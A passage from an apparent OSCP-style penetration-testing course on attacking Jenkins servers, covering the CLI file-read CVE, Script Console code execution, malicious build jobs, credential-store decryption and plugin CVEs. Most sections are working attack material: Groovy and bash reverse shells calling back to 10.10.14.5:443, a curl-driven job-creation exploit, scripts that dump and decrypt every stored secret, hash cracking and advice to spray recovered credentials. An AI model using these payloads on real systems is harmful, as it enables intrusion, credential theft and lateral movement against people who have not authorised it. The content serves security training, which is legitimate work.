reverse them, but you *can* often find *live* tokens leaked in logs/configs. *OSCP
relevance:* medium-high — a token leaked in a readable build log is a clean identity.

## 5.6 The auth/authz decision, summarised

Your goal through Part V: **reach an identity that holds an RCE-equivalent permission.** The
paths are (a) no auth needed — "anyone can do anything" or anonymous has `RunScripts`; (b)
open signup → an account that (via loose strategy) can execute; (c) default/weak/reused/
leaked creds → an account that can execute; (d) a leaked API token. At each, check `/whoAmI/`
and look for Script Console / New Item / Manage Jenkins. Authentication is the doorway;
**authorization to execute is the actual prize** — never stop at "I logged in."

---

# PART VI — The Jenkins CLI (and CVE-2024-23897)

Jenkins ships a command-line interface reachable over HTTP (`/cli`) and sometimes a
dedicated port. It matters for two reasons: some CLI commands are usable **pre-auth or with
minimal rights**, and — the headline — **CVE-2024-23897** turns the CLI into an **arbitrary
file read** primitive that works with only anonymous/overall-read access. On a Jenkins whose
version is in range, this single CVE is frequently the entire foothold, because it reads the
files that decrypt the credentials store and the initial admin password.

## 6.1 Concept — the CLI

*Concept:* the CLI (`jenkins-cli.jar`, or raw HTTP requests) lets you run administrative and
job commands from outside the UI. It authenticates via API token, SSH key, or username/
password; but a number of commands are exposed to low-privilege or anonymous callers
depending on config. *Why it matters:* it's a second, less-hardened door to Jenkins
functionality, and the host of CVE-2024-23897.

*Recognition/enumeration:*

```text
$ curl -sI http://target:8080/ | grep -i cli-port          # X-Jenkins-CLI-Port
$ wget http://target:8080/jnlpJars/jenkins-cli.jar         # grab the client
$ java -jar jenkins-cli.jar -s http://target:8080/ help    # list available commands (anon!)
$ java -jar jenkins-cli.jar -s http://target:8080/ who-am-i # current identity
```

`help` listing commands anonymously already tells you the CLI is open and what's reachable
without auth.

## 6.2 CVE-2024-23897 — arbitrary file read (the big one)

**Concept.** Jenkins' CLI command parser (args4j) expands an argument beginning with `@` by
**reading the file at that path and substituting its contents** as arguments. Because this
happens *before* permission checks on many commands, an attacker with only **Overall/Read**
(and, for the first line of a file, even **anonymous** on instances where anonymous has
read) can read arbitrary files on the controller. Affects **Jenkins ≤ 2.441** and **LTS ≤
2.426.2** (patched in 2.442 / 2.426.3).

**Why it matters.** File read on the controller = read `secrets/master.key`,
`secrets/hudson.util.Secret`, `credentials.xml`, `users/*/config.xml`,
`initialAdminPassword`, and any OS file the `jenkins` user can (`/etc/passwd`, SSH keys). It
converts a *read-only or even unauthenticated* posture into **full credential theft**, and —
via decrypting the store or reading the initial admin password — often into admin and then
RCE.

**Enumeration/validation.** Confirm the version is in range (Part II), then test the
primitive on a harmless file:

```text
# Using the CLI jar; the '@' trick makes it read a local (server-side) file:
$ java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node "@/etc/passwd"
# The error message echoes back the file contents (line by line) as "no such node: <line>"
ERROR: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
...
```

The trick: pick a CLI command that echoes its (invalid) argument back in an error, feed it
`@/path/to/file`, and the error leaks the file's contents. (Public PoCs automate reading a
whole file across requests; the mechanism is the `@file` arg expansion.)

**Exploitation → the chain.** Read, in order:
`secrets/master.key`, `secrets/hudson.util.Secret`, `credentials.xml` → decrypt offline
(Part X) → recover stored SSH keys / passwords / admin token → log in as admin / SSH to the
box → RCE. Or read `secrets/initialAdminPassword` if the instance was never fully set up.

**Validation vs assumption.** Prove the read on `/etc/passwd` (Linux) or a known file before
claiming it; confirm the version is actually ≤ the patched line (Part XIII discipline).
**Failure cases:** patched versions (≥2.442 / ≥2.426.3); the CLI disabled; a command that
doesn't echo the arg (use a known-good one like `connect-node`, `reload-configuration`,
`help`); files the `jenkins` user can't read; on some instances anonymous can only read the
*first line*, which is still enough for single-line secrets like `master.key`-adjacent files
(and full multi-line read needs Overall/Read).

*OSCP relevance:* **very high** for current exam-era boxes — this is one of the most
impactful and commonly-featured Jenkins CVEs, precisely because it defeats the "locked-down,
anonymous-can't-see-anything" posture that would otherwise stop you.

## 6.3 Other CLI angles

- **Authed CLI = admin actions.** With an admin token/creds, the CLI runs `groovy =` (feed
  Groovy on stdin → RCE), `install-plugin`, `build <job>`, etc. `groovy` over the CLI is a
  clean RCE once you have sufficient rights.

```text
$ echo 'println "id".execute().text' | java -jar jenkins-cli.jar -s http://target:8080/ \
      -auth admin:<token> groovy =
```

- **Pre-auth command exposure.** Depending on version/config, some commands run without full
  auth; enumerate with `help` and test the low-risk ones.

*OSCP relevance:* the authed `groovy =` RCE is a reliable alternative to the web Script
Console when you have creds but the UI is awkward.

## 6.4 The CLI in the methodology

Treat the CLI as a parallel access channel to the UI: it can leak files (2024-23897) with
*less* privilege than the UI requires, and it can execute Groovy with admin creds. On any
in-range version, the CLI file-read is an **instant-win check** (Part III step 2) — test it
early, because it often works on exactly the hardened instances where UI enumeration
returns nothing.

---

# PART VII — The REST API & Remote Access

Almost everything in the Jenkins UI has a machine-readable equivalent under an `/api/`
suffix, and most attacker actions can be driven by `curl` against the REST API. Knowing the
API matters because it's how you *script* enumeration and exploitation, how you use a leaked
**API token**, and how the **CSRF crumb** requirement is satisfied for state-changing
requests.

## 7.1 Concept — the API surface

*Concept:* append `/api/json`, `/api/xml`, or `/api/python` to most URLs for structured
data. Examples:

```text
/api/json?pretty=true                    # instance overview (jobs, views, mode, nodeName)
/job/<name>/api/json                      # job detail (builds, params, SCM)
/job/<name>/<n>/api/json                  # build detail
/job/<name>/config.xml                    # RAW job config (GET to read, POST to write!)
/computer/api/json                        # nodes/agents
/whoAmI/api/json                          # current identity + authorities
/crumbIssuer/api/json                     # get a CSRF crumb (needed for POSTs)
```

*Why it matters:* the API is the automation layer — read job configs/build data in bulk,
and (with rights) *create/modify* jobs and *trigger builds* purely via HTTP.

## 7.2 Authentication to the API

Three ways, in attacker-preference order:

```text
# 1) API token (best — no password, no interactive login)
$ curl -s -u alice:<api-token> http://target:8080/whoAmI/api/json
# 2) username:password (basic auth)
$ curl -s -u admin:password http://target:8080/api/json
# 3) session cookie (from a UI login) + crumb for POSTs
```

## 7.3 The CSRF crumb — required for state-changing requests

Jenkins protects POSTs with a CSRF token ("crumb"). To create a job, trigger a build, or run
a script via HTTP you first fetch a crumb and include it:

```text
$ CRUMB=$(curl -s -u admin:token 'http://target:8080/crumbIssuer/api/json' \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["crumbRequestField"]+":"+d["crumb"])')
$ curl -s -u admin:token -H "$CRUMB" -X POST http://target:8080/... 
```

*Interpretation:* a `403 No valid crumb` on a POST means you skipped this step, not that
you're unauthorized. Fetch the crumb and retry. *Failure:* on some configs the crumb is
tied to the session/IP; use the same session you fetched it with.

## 7.4 API-driven exploitation

With sufficient rights, the API *is* the exploit tool:

- **Read every job config/build log in bulk** (7.1) → credential harvest (Part X).
- **Create a job via `createItem`** with a shell build step, then **trigger it** via
  `/job/<name>/build` → RCE (Part IX), all over `curl`.
- **Run Groovy via `/scriptText`** (POST, with crumb, needs RunScripts) → RCE (Part VIII).
- **Use a leaked token** to do any of the above as that user.

```text
# Groovy RCE via the API (needs Overall/RunScripts + crumb):
$ curl -s -u admin:token -H "$CRUMB" --data-urlencode \
    'script=println "id".execute().text' http://target:8080/scriptText
```

## 7.5 Interpretation, failure, relevance

The API returns the same data the UI would show *your identity* — so a `403`/empty result is
an authorization signal, not necessarily "the data doesn't exist." *Failure cases:* missing
crumb (403), insufficient rights (403/empty), a proxy stripping `/api`. *OSCP relevance:*
high as the *mechanism* — you'll drive the Script Console and job-creation exploits through
`curl`+crumb constantly, and a leaked API token is a clean, common identity. The API isn't a
separate vuln so much as the remote-control layer for every other technique.

---

# PART VIII — The Script Console (Groovy → RCE)

This is the crown jewel of Jenkins offense and deserves the full ten-lens treatment. The
Script Console runs **arbitrary Groovy on the controller JVM with no sandbox**, as the
Jenkins process user. There is no exploit to write, no bug to trigger — it is a *feature*
that hands you a root-of-the-application shell. If you can reach it, you have RCE. Full stop.

**Concept.** At `http://target:8080/script` (UI) and `/scriptText` (raw), Jenkins provides a
Groovy console intended for admins to run maintenance scripts. Groovy is a full JVM language,
so it can spawn OS processes, read/write files, open sockets — anything the `jenkins` user
can do. It is **not** the sandboxed pipeline Groovy; the Script Console is unrestricted.

**Why it matters.** One request = command execution as the Jenkins user (often SYSTEM on
Windows, `jenkins` on Linux). It's the cleanest, most reliable RCE in the entire product and
the reason "does my identity have `Overall/RunScripts`?" is the most important question in
Part V.

**Recognition.** `GET /script` returns a text area titled "Script Console" if you have
rights (or if anonymous does). A `403`/redirect-to-login means you need an identity with
`Overall/RunScripts` or `Overall/Administer` first.

**Enumeration — is it reachable for me?**

```text
$ curl -s -b cookies http://target:8080/script | grep -i 'script console'   # UI reachable?
$ curl -s -u admin:token http://target:8080/script | grep -i 'Groovy'
```

**Exploitation — the payloads.** In the console (or via `/scriptText`):

```groovy
// Basic command execution (Linux):
println "id".execute().text
println ["/bin/bash","-c","id; hostname; cat /etc/passwd"].execute().text

// Windows:
println "cmd /c whoami".execute().text

// Reverse shell (Linux) — one reliable form:
String host="10.10.14.5"; int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(["/bin/bash","-c","bash -i >& /dev/tcp/${host}/${port} 0>&1"]).redirectErrorStream(true).start();
p.waitFor();

// Read the credential-store files directly (then decrypt — Part X):
println new File("/var/lib/jenkins/secrets/master.key").text
```

Via the API (no UI, needs crumb + RunScripts):

```text
$ curl -s -u admin:token -H "$CRUMB" --data-urlencode \
   'script=println "id".execute().text' http://target:8080/scriptText
```

**Validation.** `println "id".execute().text` returning `uid=...(jenkins)` (or SYSTEM on
Windows) proves RCE unambiguously. Always run `id`/`whoami` first — on Windows you may
already be SYSTEM and need no privesc.

**Pivot.** From Script Console RCE you: (1) decrypt the credentials store *in Groovy itself*
(Jenkins exposes `hudson.util.Secret.decrypt()` and the credentials API, so you can print
plaintext secrets without even touching the key files — Part X.4); (2) spawn a reverse shell
for a stable foothold; (3) enumerate agents and run code on them (Part XIV); (4) local
privesc (Part XVIII).

**Failure cases.** You lack `Overall/RunScripts`/`Administer` (the console 403s) — then you
need a different primitive (job build step, CLI, plugin) or a way to escalate your Jenkins
permissions. That's the *only* real failure mode — if the console loads, it works.

**OSCP relevance.** **Very high.** An exposed or reachable Script Console is one of the most
common and decisive Jenkins footholds. The first thing to check after confirming Jenkins is
whether `/script` is reachable — for anonymous, or for whatever identity you can get.

## 8.1 Decrypting credentials from within Groovy (preview of Part X)

Because the Script Console runs *inside* Jenkins, it can ask Jenkins to decrypt its own
secrets — no offline key math needed:

```groovy
// Dump all stored credentials as plaintext, straight from the console:
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardCredentials
def creds = CredentialsProvider.lookupCredentials(StandardCredentials, Jenkins.instance, null, null)
creds.each { c -> println "${c.id}: ${c.properties}" }

// Decrypt a specific Secret value:
println hudson.util.Secret.fromString("{AQAAABAAAA...}").getPlainText()
```

This is why Script Console access is so devastating: it's not just RCE, it's *instant
plaintext access to every secret Jenkins holds* — git tokens, SSH keys, cloud creds, service
passwords — which then fuel lateral movement and privilege escalation everywhere else.

---

# PART IX — Build Jobs & Pipelines as an Execution Primitive

When you *can't* reach the Script Console but your identity can create or configure a job,
you still have RCE — because **a job's whole purpose is to run commands.** This Part treats
jobs and pipelines as what they are to an attacker: a command-execution interface with extra
steps. It's the second-most-common Jenkins foothold after the Script Console.

## 9.1 Concept — jobs run commands by design

*Concept:* a **Freestyle** job has build steps including "**Execute shell**" (Linux) and
"**Execute Windows batch command**" (Windows) — literally a text box whose contents run on
the build node. A **Pipeline** job runs a Groovy `Jenkinsfile` with `sh`/`bat` steps. Either
way, if you can define a build step and trigger a build, your text runs as the Jenkins (or
agent) user. *Why it matters:* it converts `Job/Create`+`Configure`+`Build` (or just
`Configure`+`Build` on an existing job) into RCE, no Script Console needed.

## 9.2 Recognition — what rights do I have?

After login, look for **"New Item"** (create), a **gear/Configure** on an existing job, and
a **"Build Now"** link. Or check via API/`whoAmI`. If you can reach `/view/all/newJob` and
POST a config, you can make a job.

## 9.3 Exploitation — Freestyle job RCE

Via the UI: New Item → Freestyle → Add build step → Execute shell →
`bash -i >& /dev/tcp/10.10.14.5/443 0>&1` → Save → Build Now → catch the shell.

Via the API (fully scripted — the exam-friendly way):

```text
# 1) craft a minimal Freestyle config with a shell build step
$ cat > job.xml <<'EOF'
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>id; bash -c 'bash -i >&amp; /dev/tcp/10.10.14.5/443 0>&amp;1'</command>
    </hudson.tasks.Shell>
  </builders>
</project>
EOF
# 2) create the job
$ curl -s -u user:token -H "$CRUMB" -H 'Content-Type: application/xml' \
     --data-binary @job.xml "http://target:8080/createItem?name=pwn"
# 3) trigger the build (nc -lvnp 443 waiting)
$ curl -s -u user:token -H "$CRUMB" -X POST "http://target:8080/job/pwn/build"
```

For **Windows** targets, swap the shell step for a batch step
(`<hudson.tasks.BatchFile><command>whoami</command></hudson.tasks.BatchFile>`) or a
PowerShell reverse shell.

## 9.4 Pipeline jobs and the sandbox

Pipeline (`Jenkinsfile`) jobs run Groovy. `sh 'id'` / `bat 'whoami'` steps execute commands.
Note the **Groovy sandbox**: pipeline script normally runs sandboxed (Script Security
plugin), so raw Groovy like `"id".execute()` is blocked *unless* an admin approved it or a
sandbox-bypass applies (Part XII/XIII). But **`sh`/`bat` steps are not the sandbox's concern
— they're legitimate pipeline steps** and run commands freely. So a pipeline with
`node { sh 'id' }` is RCE on the agent even under the sandbox. *This distinction trips
people up:* "the Groovy sandbox blocks me" applies to Groovy language tricks, not to the
`sh` step that's *designed* to run shell.

```groovy
// Pipeline RCE (runs on an agent labelled 'built-in' or any node):
node {
    sh 'id; hostname; cat /etc/passwd'
    // or a reverse shell:
    sh 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'
}
```

## 9.5 Where does it run? Controller vs agent

*Important interpretation:* a build runs on whatever **node** it's assigned to. On a
single-machine Jenkins, builds run on the **built-in node** (the controller) → you get the
controller's user (jenkins/SYSTEM). If builds are pinned to an **agent**, your command runs
on the *agent*, not the controller — which is still a foothold, and a lateral-movement
insight (Part XIV): you might land on a different machine than the one hosting the web UI.
Check the build log's "Running on <node>" line to know where your shell will be.

## 9.6 Validation, failure, pivot, relevance

*Validation:* the build console shows your command output (`id`/`whoami`) → RCE confirmed.
*Failure:* you lack job create/configure/build rights (then → Script Console, CLI, or
escalate perms); builds are pinned to an agent that's offline (no executor). *Pivot:* same as
Script Console — decrypt creds, hit agents, privesc; plus the controller-vs-agent placement
tells you the network shape. *OSCP relevance:* **high** — the "register/weak-login → create a
job → build → shell" chain is a staple, and the API version is clean and repeatable.

## 9.7 Existing-job hijack

If you can't *create* a job but can **configure** an existing one (or trigger a
parameterised build that takes a command-ish parameter), you edit its build step or abuse a
parameter to inject a command. Also: a job you can *build* but not configure may still run
attacker-controlled input if it pulls from an SCM repo you can write to (poison the
`Jenkinsfile`/build script in git → next build runs your code). *OSCP relevance:* medium;
the SCM-poisoning angle is a nice lateral trick when write access to a repo exists.

---

# PART X — Credential Discovery & Secret Decryption

Jenkins is a **secrets vault**: it stores the credentials needed to reach git, cloud, deploy
targets, databases, and other servers, so builds can authenticate. Once you have RCE or file
read on the controller, extracting and decrypting these is usually the highest-value
post-exploitation action — they're the fuel for lateral movement and often for privilege
escalation. This Part is the systematic method, and it follows the same principle as the
XAMPP course's Part X:

> **If Jenkins runs builds that authenticate to other systems, then the credentials to do so
> are stored, encrypted, on the controller — and Jenkins holds the key to decrypt them.**
> Your job is to get the ciphertext and the key (or ask Jenkins to decrypt for you).

## 10.1 Where the secrets live

- **`JENKINS_HOME/credentials.xml`** — the global credentials store (usernames+passwords,
  SSH private keys, secret text/tokens, certificates), encrypted.
- **`JENKINS_HOME/jobs/<job>/credentials.xml`** — per-folder/job credentials.
- **`JENKINS_HOME/secrets/master.key`** — a large hex key.
- **`JENKINS_HOME/secrets/hudson.util.Secret`** — the AES key material, itself encrypted
  with `master.key`.
- **`JENKINS_HOME/users/<user>/config.xml`** — per-user API token hash, password hash
  (`#jbcrypt:...` — crackable), and sometimes secrets.
- **`JENKINS_HOME/secrets/initialAdminPassword`** — first-run admin password (plaintext).
- **Build logs** (`jobs/*/builds/*/log`) — frequently leak secrets in plaintext (echoed
  env, `git clone https://user:token@...`).
- **Job configs** (`jobs/*/config.xml`) — SCM URLs, sometimes embedded secrets, credential
  IDs.

## 10.2 The encryption model (so you know what you need)

Jenkins encrypts credentials with an AES key stored in `secrets/hudson.util.Secret`, which
is itself encrypted using `secrets/master.key`. So to decrypt `credentials.xml` **offline**
you need **all three**: `master.key`, `hudson.util.Secret`, and `credentials.xml`. Miss any
one and offline decryption fails. This is exactly why the CVE-2024-23897 file-read chain
(Part VI) targets those three files specifically.

## 10.3 Offline decryption (when you have the files but not RCE)

If you obtained the three files via file-read (CVE-2024-23897, anonymous file access, or a
backup), decrypt offline. The community tool is well-known; the manual method:

```text
# Files needed: master.key, hudson.util.Secret, credentials.xml
# Tools: jenkins_decrypt.py / jenkins-credential-decryptor / a short Groovy on a local Jenkins.
$ python3 jenkins_decrypt.py master.key hudson.util.Secret credentials.xml
[+] appuser:Sup3rS3cret
[+] ssh-key: <OpenSSH private key, redacted>
[+] github-token: ghp_xxxx
```

*Interpretation:* the output is plaintext usernames/passwords/keys/tokens — immediately try
them (reuse doctrine, 10.6). *Failure:* wrong/partial key files → garbage; ensure you read
the full binary files (base64/exact bytes) not a truncated copy.

## 10.4 Online decryption (when you have RCE / Script Console)

Far easier: if you have the Script Console or any Groovy execution, **ask Jenkins to decrypt
for you** (it has the keys loaded):

```groovy
// Every credential, plaintext, no key files needed:
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach {
  it.properties.each { k,v -> println "${k} = ${v}" }
}
// Or decrypt a single {AQAA...} blob straight from a config.xml you found:
println hudson.util.Secret.fromString('{AQAAABAAAAAg...}').getPlainText()
```

This is the preferred method whenever you have code execution — no offline math, no risk of
truncated key files. Grab a `{AQAA...}` string from any `config.xml` and decrypt it in one
line.

## 10.5 Cracking user password hashes

`users/<user>/config.xml` contains bcrypt password hashes (`#jbcrypt:$2a$...`). Crack with
hashcat/john:

```text
$ hashcat -m 3200 jenkins_hashes.txt /usr/share/wordlists/rockyou.txt   # bcrypt
```

A cracked admin password → UI admin → Script Console → RCE (if you didn't already have it).
*OSCP relevance:* medium — useful when you have file read but not RCE, and the admin's
password is weak.

## 10.6 The reuse doctrine

Decrypted Jenkins credentials are lateral-movement gold: they are, by definition, creds that
work on *other systems* (git, deploy targets, databases, cloud, other servers). Try every
recovered credential:

- **SSH keys / passwords** → SSH to the Jenkins host itself and to any host in the creds
  (privesc + lateral).
- **Service/app passwords** → the services they name, and reused elsewhere.
- **The `jenkins` user's own context** → these creds often belong to accounts with more
  privilege than `jenkins`.
- **API/git tokens** → clone private repos (more secrets, more source).

On the OSCP, a decrypted SSH key from the Jenkins store that logs into the box as a *more
privileged* user is a classic privesc (Part XVIII). Always spray recovered creds against the
host and every service.

## 10.7 Ten-lens wrap

*Validation:* a decrypted credential is a hypothesis until it authenticates — test it.
*Pivot:* creds → SSH/lateral/privesc; hashes → crack → admin. *Failure:* only partial key
files (offline decrypt fails — get the missing one, or use the online Groovy method);
credentials store empty (fall back to build-log/job-config plaintext leaks). *OSCP
relevance:* **very high** — on Jenkins, the credential store is usually the bridge from
"foothold on the CI server" to "the rest of the network," and the online Groovy decrypt makes
it trivial once you have the Script Console.

---

# PART XI — Common Initial-Access Paths (8 Scenarios)

Now assembly: how the pieces chain into a foothold. Each scenario is a reasoning chain you
*recognise* from enumeration, not a script you memorise. They all end in the same place —
code execution as the Jenkins user — but reach it through different rings of the Part I
model. On the exam you'll often splice two together.

## Scenario 1 — Exposed Script Console (anonymous or weak-auth → instant RCE)

*Chain:* `/script` reachable (anonymous, or after a trivial login) → Groovy → RCE.
*Reasoning:* recognition confirms Jenkins; you immediately `curl /script` and it returns the
console (authorization strategy is "anyone can do anything" or anonymous has `RunScripts`).
`println "id".execute().text` → `uid=...(jenkins)`. Reverse shell → foothold. *Key
decisions:* checking `/script` as the very first instant-win, before any methodical enum.
*Failure:* console 403s → you need an identity (Scenario 2) or another primitive.

## Scenario 2 — Open signup + loose authorization → account → Script Console

*Chain:* `/signup` open → register → the authorization strategy grants authenticated users
script/admin rights → `/script` → RCE. *Reasoning:* the dashboard bounces you to login, but
the login page offers "Create an account." You register `attacker:attacker`; `/whoAmI/` now
shows you authenticated; the instance uses "Logged-in users can do anything" (or a matrix
that grants `authenticated` too much), so `/script` loads → RCE. *Key decisions:* spotting
open signup; re-checking `/whoAmI/` and `/script` *after* registering. *Failure:* signup
gives only `Overall/Read` → pivot to job rights or info-harvest.

## Scenario 3 — CVE-2024-23897 file read → decrypt store → admin/SSH → RCE

*Chain:* in-range version → CLI `@file` read → grab `master.key`+`hudson.util.Secret`+
`credentials.xml` (and/or `initialAdminPassword`) → decrypt → admin login or SSH key → RCE.
*Reasoning:* the UI is locked down (anonymous sees nothing), but the version is ≤2.426.2. You
use the CLI file-read to pull the three secret files, decrypt offline (Part X.3) → recover an
SSH private key for a user on the box → `ssh` in → foothold, possibly privileged. Or read
`initialAdminPassword` → log in as admin → Script Console. *Key decisions:* not giving up on
a "locked-down" Jenkins — the CVE defeats exactly that posture; targeting the three
decryption files specifically. *Failure:* patched version → this path is closed, pivot.

## Scenario 4 — Weak/reused/leaked credentials → admin → RCE

*Chain:* default/weak/reused creds (or a token leaked in a readable build log/git) → admin →
Script Console/job → RCE. *Reasoning:* an anonymous-readable build log contains
`git clone https://deploy:S3cr3t@github...`; you try `deploy:S3cr3t` at the Jenkins login (or
it's the admin's reused password) → admin → RCE. *Key decisions:* reading build logs for
leaked creds; the reuse doctrine (try leaked creds at the Jenkins login). *Failure:* creds
don't work / account is low-priv → keep harvesting.

## Scenario 5 — Job creation rights → Freestyle/pipeline build → RCE

*Chain:* an identity with `Job/Create`+`Configure`+`Build` (but *not* `RunScripts`) →
create a job with an "Execute shell" step → build → shell. *Reasoning:* `/script` 403s, but
"New Item" is available. You create a Freestyle job (or a `node { sh '...' }` pipeline) with
a reverse-shell build step, trigger it, catch the shell (Part IX). *Key decisions:*
recognising that job rights = RCE even without Script Console access; knowing `sh`/`bat`
steps bypass the Groovy sandbox concern. *Failure:* no create rights but *configure* on an
existing job → hijack that job's step instead.

## Scenario 6 — Vulnerable plugin (version-matched CVE) → RCE / auth bypass

*Chain:* a plugin at a vulnerable version → its CVE (RCE, path traversal, auth bypass) →
foothold or file read. *Reasoning:* the version alone is patched, but `/pluginManager` (or
the update-center JSON) reveals an old plugin with a known unauth RCE. You fire the matched
exploit (Part XII/XIII), validated against the exact version. *Key decisions:* enumerating
*plugin* versions, not just core; validating the CVE's preconditions. *Failure:* plugins
current, or the CVE needs auth you lack → pivot.

## Scenario 7 — Stapler pre-auth RCE (CVE-2018-1000861) on old Jenkins

*Chain:* Jenkins ≤2.153 / LTS ≤2.138.3 → the Stapler routing RCE (often chained with the
Script Security / Groovy sandbox bypass in the Pipeline plugins) → unauthenticated RCE.
*Reasoning:* recognition shows an *old* Jenkins. This version has the famous
`/securityRealm/user/admin/descriptorByName/.../checkScript` pre-auth Groovy execution path.
You send the crafted request → code runs unauthenticated → foothold. *Key decisions:*
version research flagging a marquee pre-auth RCE; using a vetted PoC and understanding what
it does. *Failure:* patched version → closed. *OSCP relevance:* classic on older lab boxes.

## Scenario 8 — Anonymous read → build-log/job-config credential harvest → lateral/admin

*Chain:* anonymous read → mine job configs + build logs for secrets → use them to log in
(admin) or move laterally → RCE. *Reasoning:* you can't execute anything as anonymous, but
you can *read* everything. Console logs leak a deploy SSH key and an admin token; the token
authenticates the API as admin → `/scriptText` → RCE. *Key decisions:* treating broad read
access as a credential mine, not a dead end; systematically reading every readable build
log. *Failure:* logs sanitised / store empty → pivot to a version CVE.

### The meta-lesson of Part XI

Every scenario is a route through the Part I rings to the same execution core. Notice the
recurring shape: **get an identity (or exploit one that needs none) → find the permission or
CVE that equals execution → run code as the Jenkins user → loot the credential store → pivot.**
And notice how many chains hinge on *reading* (build logs, configs, decrypted store) — on
Jenkins, information disclosure and credential theft are as central as the execution itself,
because the controller is a secrets hub.

---

# PART XII — The Plugin Attack Surface

Jenkins core is relatively small; **most of Jenkins is plugins** — 1800+ of them, of wildly
varying quality and patch cadence. Historically, a large share of Jenkins' high-impact CVEs
(RCE, auth bypass, path traversal, XXE, credential disclosure) have been in *plugins*, not
core. So "the core version is patched" is only half the version story — you must enumerate
plugin versions too.

## 12.1 Concept & why it matters

*Concept:* plugins add build steps, SCM integrations, auth realms, UI, etc. Each is
independently versioned and independently vulnerable. *Why it matters:* a fully-patched
Jenkins core can still host a plugin with an unauthenticated RCE; the plugin surface is often
where the *intended* path is on a box that looks hardened at the core level.

## 12.2 Recognition & enumeration — listing plugins and versions

```text
# If you have admin/manage: the UI
/pluginManager/installed                       # names + versions (HTML)
# API / scripted:
$ curl -s -u user:token http://target:8080/pluginManager/api/json?depth=1 \
    | python3 -c 'import sys,json;[print(p["shortName"],p["version"]) for p in json.load(sys.stdin)["plugins"]]'
# From the Script Console (if you have it):
Jenkins.instance.pluginManager.plugins.each{ println "${it.shortName} ${it.version}" }
# Unauth hints: some plugins expose version-stamped static asset paths, or endpoints that 404 vs 200.
```

*Interpretation:* you now have a plugin+version inventory to map against known CVEs (Part
XIII). *Failure:* without rights you may only infer a few plugins from asset paths/endpoints;
still worth checking the marquee ones.

## 12.3 Classes of plugin vulnerability to look for

- **Unauthenticated RCE** — the highest value; e.g. historical Script Security / Pipeline
  Groovy sandbox bypasses that allowed unauth or low-priv Groovy execution.
- **Path traversal / arbitrary file read** — several plugins have had these (read
  `credentials.xml`, `/etc/passwd`); complements CVE-2024-23897.
- **Auth/permission bypass** — a plugin endpoint reachable without the expected permission.
- **Credential disclosure** — plugins that expose stored secrets to lower-priv users.
- **XXE / SSRF** — in plugins parsing XML or fetching URLs.

## 12.4 The Groovy sandbox / Script Security angle

The **Script Security** plugin sandboxes pipeline Groovy so untrusted `Jenkinsfile` code
can't do arbitrary JVM things. A recurring vulnerability class is a **sandbox bypass**: a
Groovy construct that escapes the sandbox to reach `Runtime.exec`. When a box lets you submit
pipeline script but sandboxes it, a version-matched sandbox-bypass turns that into RCE. (And
remember Part IX.4: `sh`/`bat` steps aren't sandboxed anyway — the bypass matters when you're
restricted to *pure Groovy* with no shell step allowed.)

## 12.5 Validation, failure, relevance

*Validation:* match the exact plugin version to the CVE's affected range; read the PoC; prove
with a benign action before the payload (Part XIII discipline). *Failure:* plugin version out
of range; the vulnerable feature not in use; the CVE needs a permission you lack. *OSCP
relevance:* medium-high — on hardened-core boxes the plugin surface is often the way in, and
enumerating plugin versions is a step people skip. Budget a check of the installed-plugins
list (or the marquee plugin CVEs) whenever the core version looks patched.

---

# PART XIII — Version-Based Vulnerability Research (the Jenkins CVEs)

Unlike the XAMPP course — where version-CVE hunting was a *late, low-priority* branch —
Jenkins genuinely rewards version research, because several of its marquee CVEs are
high-reliability, high-impact, and commonly the intended exam path. But the *discipline*
still applies: a CVE is not an attack until you've validated the version, the preconditions,
the auth requirement, and the payoff. This Part gives both the validation method and a map of
the CVEs actually worth knowing.

## 13.1 The six-question filter (same rigor, higher hit-rate)

For a Jenkins core/plugin version and a candidate CVE, answer in order; stop at the first
"no":

```text
1. Is THIS exact version in the affected range?  (core X.Y.Z or LTS line; plugin version)
2. Is it remotely exploitable (vs local-only)?
3. What auth does it need — none, Overall/Read, or admin?  (do I have that?)
4. Does it give useful access — RCE / file-read / cred-disclosure (good) vs DoS (useless)?
5. Is it reliable?  (Jenkins logic/parser CVEs tend to be reliable; good.)
6. Are the preconditions present?  (CLI enabled? the vulnerable plugin installed? sandbox in use?)
```

Jenkins CVEs *frequently* survive all six — that's why version research is worth more here —
but you still verify rather than assume.

## 13.2 The CVEs worth knowing (the map)

**CVE-2024-23897 — CLI arbitrary file read.** Jenkins ≤2.441 / LTS ≤2.426.2. Auth: anonymous
(first line) or Overall/Read (full file). Payoff: read `secrets/*`+`credentials.xml`+
`initialAdminPassword` → decrypt → admin/SSH → RCE. *Reliable, current-era, defeats
locked-down instances.* The single most important modern Jenkins CVE. (Part VI.)

**CVE-2018-1000861 — Stapler pre-auth RCE.** Jenkins ≤2.153 / LTS ≤2.138.3. Auth: none
(pre-auth). Payoff: unauthenticated code execution (via the dynamic-routing + a Groovy
sandbox bypass, commonly the "Pipeline: Groovy" / Script Security chain). *The classic old-
Jenkins one-shot RCE.* (Part XI Scenario 7.)

**Script Security / Pipeline sandbox bypasses** (various CVEs across years) — turn low-priv
pipeline Groovy into RCE on affected plugin versions. (Part XII.4.)

**CVE-2019-1003000 family** (Script Security / Groovy) — pre-auth/low-priv RCE via sandbox
bypass on older Pipeline plugin versions. Chained in several public Jenkins exploits.

**Credential/file-disclosure plugin CVEs** — numerous; map from your plugin inventory.

**The "not really a CVE" defaults** — exposed Script Console, "anyone can do anything," open
signup + loose authz: these aren't version bugs at all, and they're *more* common than the
CVEs. Don't let CVE-hunting distract from checking them (Part III's instant-win step).

## 13.3 Researching properly

```text
$ searchsploit jenkins                     # local mirror
$ searchsploit -x <EDB-ID>                 # READ it: version range, auth, reliability
# Cross-check the exact affected range on the Jenkins security advisory for the CVE.
# For plugins, map each plugin+version from your inventory (Part XII) to advisories.
```

Read the exploit and the advisory before firing — they state the exact affected versions,
the auth needed, and the mechanism, i.e. they answer the six questions for you. A Jenkins
PoC that "should work" on the wrong LTS line will simply fail.

## 13.4 The correct default on Jenkins

*Because* Jenkins version-CVEs hit often, the ordering is different from XAMPP: after the
instant-win checks (open `/script`, weak creds), **version research is a legitimate early
